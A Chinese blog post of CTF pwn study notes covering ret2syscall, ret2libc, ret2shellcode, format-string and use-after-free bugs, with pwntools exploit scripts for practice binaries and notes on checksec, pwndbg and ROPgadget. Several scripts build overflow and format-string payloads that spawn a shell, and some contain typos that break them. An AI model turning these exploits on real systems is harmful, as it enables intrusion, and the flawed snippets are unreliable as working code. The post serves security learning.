<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509113727771.png" alt="image-20230509113727771"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509212024902.png" alt="image-20230509212024902"></p>
<p>这是我自己对gadget栈帧变化的理解</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512112211664.png" alt="image-20230512112211664"></p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>调用系统调用来getshell</p>
<p>32位</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eax应该为0xb</span><br><span class="line"></span><br><span class="line">ebx应该指向/bin/sh的地址，其实执行sh的地址也可以</span><br><span class="line">ecx应该为О</span><br><span class="line"></span><br><span class="line">edx应该为0</span><br><span class="line"></span><br><span class="line">最后再执行int 0x80触发中断即可执行execve()获取shell</span><br></pre></td></tr></table></figure>





<h2 id="return-to-libc"><a href="#return-to-libc" class="headerlink" title="return to libc"></a>return to libc<img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510133902239.png" alt="image-20230510133902239"></h2><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510134628326.png" alt="image-20230510134628326"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510134643590-16836976040121.png" alt="image-20230510134643590"></p>
<p>动态链接编译文件的时候会先把要连接的函数放入plt表，然后使用的时候先去plt表找，找到后再经过一系列操作找到这个函数的原地址，然后把这个地址放入got_plt，这样第二次再用这个函数的时候就直接去got_plt表中找。</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510213727188.png" alt="image-20230510213727188"></p>
<p>如果要构建调用plt中的system的payload，那要在栈上多加一个exit()</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510213924724.png" alt="image-20230510213924724"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512110726737.png" alt="image-20230512110726737"></p>
<p>调用plt中的system函数时，要启用/bin/sh得将这个参数压入栈</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512110842869.png" alt="image-20230512110842869"></p>
<p>栈帧结构还是这样，当前所调用的参数是在父函数的栈帧里，比如应该是先push command，然后再call system，此时command是在父函数中，也就是在当前函数的return address前面</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512111830300.png" alt="image-20230512111830300"></p>
<p>这是一个通用结构，payload要调用两个以上的函数时使用</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512114350317.png" alt="image-20230512114350317"></p>
<p>这是简易结构，构造两个函数的payload就使用这个</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512114526185.png" alt="image-20230512114526185"></p>
<p>这个是最终简化版本</p>
<p>那么ret2libc1的exp这里记录一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;url&quot;</span>,port)</span><br><span class="line">system_plt=<span class="built_in">hex</span>(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">bin_sh=<span class="built_in">next</span>(elf.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(system_plt)+<span class="string">b&#x27;BBBB&#x27;</span>+p32(bin_sh)</span><br><span class="line">io.sendline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ret2libc2</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230512182133406.png" alt="image-20230512182133406"></p>
<p>这道题没有给/bin/sh字符串的信息，不能直接构造，所以选择在全局变量buf2中放入数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">io=process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">buf2=elf.symbols[<span class="string">&quot;buf2&quot;</span>]</span><br><span class="line">gets_plt=elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(gets_plt)+p32(system_plt)+p32(buf2)+p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)<span class="comment">#\x00是结束符</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230513130643251.png" alt="image-20230513130643251"></p>
<p>这里是个通用的payload构造，因为这里是分部分进行的，第一部分进行get函数的执行，执行完之后要恢复栈帧情况，函数的执行一开始需要push ebp，所以需要一个pop出去，然后再return</p>
<p>ret2libc3</p>
<p>这道题没有后门函数，plt也没有system函数的表象，也没有/bin/sh的信息，并且漏洞还隐藏在了strcpy中，那么payload构造应该是要通过libc中的函数来得到</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>,<span class="number">1002</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc =ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line"><span class="comment">#drop是将接收到的数据里的\n丢弃</span></span><br><span class="line">libcBase=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印success x代表16进制</span></span><br><span class="line">success(<span class="string">&quot;libcBase-&gt;(:#x)&quot;</span>,<span class="built_in">format</span>(libcBase))</span><br><span class="line"><span class="comment">#oneGadget = libcBase+0x3a9fc 这是一个one_gadget工具</span></span><br><span class="line"><span class="comment">#sudo apt -y install ruby</span></span><br><span class="line"><span class="comment">#sudo gem install one_gadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=flat(cyclic(60),oneGadget) cyclic(60)可以直接生成60个字节的垃圾数据 </span></span><br><span class="line">payload=flat(cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],0xdeadoeef,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





<p>记录的一个return to shellcode的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io=process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">text=io.recvline()[<span class="number">14</span>-<span class="number">2</span>]</span><br><span class="line"><span class="comment">#	print text[14-2]</span></span><br><span class="line">buf_addr=<span class="built_in">int</span>(text,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload=shellcode+<span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x88</span> + <span class="number">0x4</span> -<span class="built_in">len</span>(shellcode))+p32(buf_addr)</span><br><span class="line">                                                         io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230527230630360.png" alt="image-20230527230630360"></p>
<p>格式化字符串漏洞的发生是在我们要打印栈中某个数据时，比如printf(“%s”,”hello”)，但是不给他相应的参数，也就是把hello去掉，那么printf参数就会将栈上相邻的数据打印出来，比如图中就会将0xffffd190往高处相邻的四个参数打印出来，然后这个格式化字符串本身的参数也就是——“%p%p%p%p”存放在这个函数所在栈帧之上的第十一个参数，也就是这个参数我 们可以控制，比如我们写成printf(“0x40001010%11$s”)，那么原来的0xffffd1bc就变成了0x40001010%11$s，然后这又是第十一个参数，那么printf就会将这个数据给打印出来，那么想要修改响应地址的参数，比如我要修改0x40001010的，就可以写成”0x40001010%8$n”，这样就可以让0x40001010地址的值  但是%n一次是打印四个字节的数据。也就是0x10000000，想要短一点就把%n写成%hn，就缩短一半，那么还有hhn，就是一半的一半</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230527234937051.png" alt="image-20230527234937051"></p>
<p>视频中第一个例子的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./fmtstr1&quot;</span>)</span><br><span class="line">payload=p32(<span class="number">0x804a02c</span>)+<span class="string">b&quot;%11$n&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230528013143186.png" alt="image-20230528013143186"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230528013253527.png" alt="image-20230528013253527"></p>
<p>brk mmap</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230528014248978.png" alt="image-20230528014248978"></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>这里标注一下看到的一个很有用的知识点：</p>
<p>(0x4002c7)(var)==函数(var) 0x4002c7是函数地址</p>
<p>fmtstr_uaf 字符串格式化漏洞 释放重用漏洞</p>
<p>UAF(use after free)漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</span><br></pre></td></tr></table></figure>

<p> 简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p>
<p>需要注意的是子程序的调用如果只有一个free的话是正确的，因为当函数返回的时候，子程序局部变量的栈针会随着子程序的返回一起销毁</p>
<p>FSB漏洞</p>
<p>格式化字符串是一种很常见的漏洞，其产生根源是printf函数设计的缺陷，即printf()函数并不能确定数据参数arg1,arg2…究竟在什么地方结束，也就是说，它不知道参数的个数。它只会根据format中的打印格式的数目依次打印堆栈中参数format后面地址的内容</p>
<p>在实际程序中，没有安全常识的程序员通常没有对用户输入进行有效地过滤，这些输入数据都作为数据传递给某些执行格式化操作的函数，如printf，sprintf，vprintf，vfprintf。恶意用户可以使用”%s”,”%x”来得到堆栈的数据，甚至可以通过”%n”来对任意地址进行读写，导致任意代码读写</p>
<p>checksec各字段：</p>
<p><strong>ASLR</strong></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509114254908.png" alt="image-20230509114254908"></p>
<p><strong>符号（Symbol）</strong></p>
<p><strong>Canary（堆栈溢出哨兵）</strong></p>
<p><strong>位置无关可执行文件（PIE）</strong></p>
<p>*位置无关可执行文件(Position-Independent Executable)*（PIE），顾名思义，它指的是放置在内存中某处执行的代码，不管其绝对地址的位置，即代码段、数据段地址随机化（ASLR）TEXT、BSS、DATA段</p>
<p><strong>NX（堆栈禁止执行）</strong></p>
<p>NX 代表 *不可执行(non-executable)*。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。在使用 <code>gcc</code> 对源程序进行编译时，默认启用此安全属性</p>
<p><strong>RELRO（GOT 写保护）</strong></p>
<p>RELRO 代表 “*重定位只读(Relocation Read-Only)*”。可执行链接格式（ELF）二进制文件使用全局偏移表（GOT）来动态地解析函数。启用 RELRO 后，会设置二进制文件中的 GOT 表为只读，从而防止重定位攻击</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/114106118">(204条消息) pwn题shellcode收集_pyiiiiiiiiiiqzvtx30vx4ap0a3hh0a00abaabtaaq2ab2bb0b___lifanxin的博客-CSDN博客</a></p>
<p>shellstorm</p>
<p><a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html">研究案例的外壳代码数据库 (shell-storm.org)</a></p>
<p>贴一个c语言调用栈的方式</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509000135336.png" alt="image-20230509000135336"></p>
<p>更改输出形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=./hello --output=json | jq</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509093528983.png" alt="image-20230509093528983"></p>
<p>一般ida反汇编出来的start函数是程序初始化环境的函数，没有什么用，也无法f5</p>
<p>选中c语言代码，右键copy to assembly，可以看到他的汇编模式</p>
<h3 id="pwntool"><a href="#pwntool" class="headerlink" title="pwntool"></a>pwntool</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line"><span class="comment">#远程</span></span><br><span class="line">io=remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">123</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509101619814.png" alt="image-20230509101619814"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">io.recvline()<span class="comment">#让本地程序输出他要执行的一行内容</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x123456</span>)+<span class="string">b&quot;0x0a&quot;</span>)<span class="comment">#输入 内容里面必须是字节流，如果是32位程序就改成p32()，0x0a是\n</span></span><br><span class="line">shell_addr=<span class="number">0x1231</span><span class="comment">#这个其实就是能够构成栈溢出的变量的起始地址，前提是有可写可执行</span></span><br><span class="line">io.sendline(<span class="string">b&quot;dsadsa&quot;</span>)</span><br><span class="line">payload=asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)<span class="comment">#ljust可以自动填充数据到112个字节跟setfill一样</span></span><br><span class="line">payload+=shell_addr</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcraft是pwntool封装的一个类，里面有很多的shellcode</span></span><br><span class="line"><span class="comment">#需要什么直接在.后面加上即，默认是32位的</span></span><br><span class="line">shellcraft.amd64.sh()</span><br><span class="line"><span class="comment">#但是这样不能直接发送payload过去，需要转成机器码</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#编写脚本的时候记得要注意攻击的环境</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接查看got_plt中的函数地址</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./re2&quot;</span>)</span><br><span class="line">hex(elf.got[<span class="string">&quot;函数名称&quot;</span>])</span><br><span class="line"><span class="comment">#查看字符串或变量的地址</span></span><br><span class="line">elf.symbols[<span class="string">&quot;buf2&quot;</span>]</span><br></pre></td></tr></table></figure>









<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509192908486.png" alt="image-20230509192908486"></p>
<p>关闭aslr命令</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509192922223.png" alt="image-20230509192922223"></p>
<p>给自己编写的文件去掉pie防护，并且nx防护也没了</p>
<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb re2</span><br><span class="line">b *0x12222 或者 b main</span><br><span class="line">n #单步步过</span><br><span class="line">stack 24 #查看栈24个字节的数据</span><br><span class="line">info b #查看断点信息</span><br><span class="line">d 1 #删除断点</span><br><span class="line">c #continue 执行到下一个断点</span><br><span class="line">start #程序执行，如果有main则停在main，没有则停在start</span><br><span class="line">backtrace #展示函数调用的主从关系</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510194830692.png" alt="image-20230510194830692"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> <span class="comment">#可以直接从子程序返回到main函数</span></span><br></pre></td></tr></table></figure>







<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509114539709.png" alt="image-20230509114539709"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">pwndbg可以直接用plt查看plt节的内容</span></span><br><span class="line">plt</span><br><span class="line"><span class="meta">#</span><span class="bash">或者使用</span></span><br><span class="line">x/20 puts@plt</span><br><span class="line">x/20 0x401030</span><br><span class="line"><span class="meta">#</span><span class="bash">直接查看栈帧中的内容</span></span><br><span class="line">x 0xffffd190</span><br><span class="line"></span><br><span class="line">got</span><br><span class="line">disasm 地址</span><br></pre></td></tr></table></figure>







<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>安装</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line"></span><br><span class="line">sudo -H python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line">ROPgadget --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot; |grep eax</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译时关掉pie</span></span><br><span class="line">gcc -fno-pie -o 编译后文件名 源文件</span><br><span class="line">gcc -fno-pie --static -o 编译后文件名 源文件 #编译成静态链接</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h4 id="linux自带工具"><a href="#linux自带工具" class="headerlink" title="linux自带工具"></a>linux自带工具</h4><h5 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230509104657154.png" alt="image-20230509104657154"></p>
<h5 id="查看文件基本信息"><a href="#查看文件基本信息" class="headerlink" title="查看文件基本信息"></a>查看文件基本信息</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 文件名</span><br></pre></td></tr></table></figure>



<h5 id="查看二进制文件字符串信息"><a href="#查看二进制文件字符串信息" class="headerlink" title="查看二进制文件字符串信息"></a>查看二进制文件字符串信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 文件名</span><br><span class="line">strings 文件名 | grep 要查找的信息</span><br></pre></td></tr></table></figure>

<h5 id="查看文件所使用的的动态链接库"><a href="#查看文件所使用的的动态链接库" class="headerlink" title="查看文件所使用的的动态链接库"></a>查看文件所使用的的动态链接库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd 文件名</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">mobb</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">http://example.com/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">All about secret</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/img1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/30/%E6%B2%A1%E5%AE%8C%E6%88%90%E7%9A%84%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%88%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"><img class="prev-cover" src="/2023/07/30/%E6%B2%A1%E5%AE%8C%E6%88%90%E7%9A%84%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%88%9B%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/%E6%94%BE%E5%AD%A6%E8%B7%AF%E4%B8%8A%E7%9A%84%E6%97%A5%E5%BC%8F%E5%B0%8F%E8%B0%83.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">大创基本知识学习</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/24/C-%E8%AF%BE%E7%A8%8B/"><img class="next-cover" src="/2022/10/24/C-%E8%AF%BE%E7%A8%8B/img1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C++课程</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">mobb</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-luck-guy"><span class="toc-number">1.</span> <span class="toc-text">1.luck_guy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Maze"><span class="toc-number">2.</span> <span class="toc-text">2.Maze</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Younger-Drive"><span class="toc-number">3.</span> <span class="toc-text">3.Younger-Drive</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86"><span class="toc-number">4.</span> <span class="toc-text">4.Java逆向解密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-pyre"><span class="toc-number">5.</span> <span class="toc-text">5.pyre</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-findit"><span class="toc-number">6.</span> <span class="toc-text">6.findit</span></a></li><li class="toc-item toc-level-1"><a 